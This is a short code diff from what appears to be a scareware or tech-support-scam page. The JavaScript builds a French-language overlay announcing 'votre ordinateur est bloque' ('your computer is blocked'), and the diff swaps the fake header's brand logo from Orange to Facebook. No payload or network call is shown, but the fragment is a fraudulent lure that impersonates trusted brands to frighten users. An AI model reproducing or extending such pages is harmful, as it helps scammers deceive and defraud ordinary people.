@@ -90,9 +90,9 @@
     '<div class="fb-bg-overlay" aria-hidden="true"></div>' +
     '<h1 class="warning-text">votre ordinateur est bloque</h1>' +
     '<section class="modal" aria-label="Modale carree">' +
-    '<header class="fb-submodal-header"><div class="orange-logo" aria-hidden="true">' +
-    '<svg viewBox="0 0 110 32" role="img" aria-hidden="true">' +
-    '<text x="0" y="24" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-size="24" font-weight="700">orange</text>' +
+    '<header class="fb-submodal-header"><div class="fb-page-logo" aria-hidden="true">' +
+    '<svg viewBox="0 0 120 32" role="img" aria-hidden="true">' +
+    '<text x="0" y="24" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-size="24" font-weight="700">facebook</text>' +
     '</svg></div>' +
     '<button class="fb-close" id="fbCloseBtn" type="button" aria-label="Fermer">&times;</button></header>' +
     '<div class="fb-submodal-separator" aria-hidden="true"></div><div class="modal-content"><div class="modal-top">' +
